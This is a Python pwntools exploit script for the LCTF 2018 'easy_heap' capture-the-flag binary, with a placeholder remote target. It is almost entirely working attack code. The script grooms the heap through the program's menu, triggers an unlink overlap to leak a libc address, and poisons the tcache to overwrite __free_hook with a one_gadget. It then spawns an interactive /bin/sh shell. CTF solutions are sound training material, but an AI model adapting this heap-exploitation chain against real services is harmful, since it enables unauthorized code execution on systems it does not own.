#!/usr/bin/python3
from pwn import *
fname = "./easy_heap"
elf = ELF(fname, checksec=False)
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

if args.REMOTE:
    io = remote("ip", 0000)
    libc = ELF("./libc-2.27.so")
else:
    io = process([fname])
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    base = io.libs()['/home/tsiao/Desktop/ctfdockers/workdir/LCTF2018_easyheap/easy_heap']
    cmd = \
    """
    b *0x{:x}
    """.format(base+0x1024)
ru = lambda x : io.recvuntil(x)
se = lambda x : io.send(x)
rl = lambda : io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sea = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a, b)
lg = lambda name,x: success(name+": 0x%x"%x)
"""
    libc-2.27.so
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
"""

def malloc(size=1,content=""):
	sla("> ","1")
	sla("> ",str(size))
	sla("> ",content)

def free(index):
	sla("> ","2")
	sla("> ",str(index))

def puts(index):
	sla("> ","3")
	sla("> ",str(index))

for i in range(10):
    malloc()
order = [9, 8, 6, 4, 2, 1, 0, 7, 5, 3]
for i in range(10):
    free(order[i])
for i in range(7):
    malloc()

malloc(0x10) # 7
malloc(0xf8) # 8
malloc() # 9

order2 = [6, 5, 9, 3, 2, 1, 0]
for i in range(7):
    free(order2[i])

free(4) # trigger unlink

puts(8)
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - (0x00007f96cc7b9ca0-0x7f96cc3ce000)
lg("libc", libc.address)
pause()
for i in range(7):
    malloc(0x10)
malloc(0x10)
free(8)
free(9)
malloc(0x10, p64(libc.sym['__free_hook']).strip(b'\x00'))
malloc(0x10)

for i in range(7, -1, -1):
    free(i)
for i in range(7):
    malloc(0x10)
"""
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
"""
malloc(0x10, p64(libc.address+0x4f3c2).strip(b'\x00'))
# gdb.attach(io, cmd)
free(0)
io.interactive()
